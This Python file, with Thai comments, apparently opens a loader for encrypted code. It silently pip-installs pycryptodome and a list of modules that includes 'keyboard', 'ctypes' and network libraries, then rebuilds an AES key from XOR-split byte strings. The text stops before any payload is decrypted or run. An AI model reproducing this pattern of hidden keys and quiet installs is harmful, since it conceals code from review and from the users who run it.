
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['asyncio', 'dataclasses', 'keyboard', 'ctypes', 'typing', 'base64', 'ujson', 'datetime', 'httpx', 'os', 'subprocess', 'requests', 're', 'rich', 'hashlib']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'I\x10\xf8rd>\xad\xe3\xeeX]}\x9f\x0b\x84\xb6k\xc2\xd8{\x81\xb1\xfd8\xd3\x06\xac\rs\xf69\xc3', b'\xe1^\xb9\xaf\x9e\x05\xb1\xbeY<\xach5\xb3\xf8!\xb6\x7f2F\xed\xc8%?\x83o\xd5A\xaf\\\xa4I', b"\xbd\xaeu\xf3d\x19Y\xc5\xb8O\x16'l\xbf\xda2\x13{\x14]C9w\x96\x9f?\xf6\xd8g\x93\xf8{"])
